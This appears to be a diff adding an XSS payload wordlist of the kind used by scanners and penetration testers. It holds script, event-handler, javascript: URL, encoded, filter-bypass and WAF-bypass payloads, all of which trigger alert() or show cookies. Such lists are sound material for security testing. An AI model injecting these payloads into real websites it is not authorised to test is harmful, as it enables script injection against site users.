@@ -1,0 +1,76 @@
+# XSS Payloads
+# Each line is a separate payload
+# Lines starting with # are comments
+
+# Basic XSS
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+
+# Image-based XSS
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img/src/onerror=alert(1)>
+
+# SVG-based XSS
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+
+# Event handlers
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+
+# JavaScript protocol
+javascript:alert(1)
+javascript:alert('XSS')
+javascript:alert(document.domain)
+
+# Iframe XSS
+<iframe src=javascript:alert(1)>
+<iframe src="javascript:alert(1)">
+
+# HTML5 tags
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+
+# Encoded payloads
+%3Cscript%3Ealert(1)%3C/script%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+# Double encoding
+%253Cscript%253Ealert(1)%253C/script%253E
+
+# Without brackets
+<script>alert`1`</script>
+<svg><script>alert`1`</script>
+
+# Filter bypass
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</sCrIpT>
+
+# Attribute breaking
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+><script>alert(1)</script>
+" onfocus=alert(1) autofocus="
+' onfocus=alert(1) autofocus='
+
+# Comment breaking
+--><script>alert(1)</script><!--
+</title><script>alert(1)</script>
+</style><script>alert(1)</script>
+
+# Case variations
+<SCRIPT>alert(1)</SCRIPT>
+<sCrIpT>alert(1)</sCrIpT>
+<IMG SRC=x ONERROR=alert(1)>
+
+# WAF bypass
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
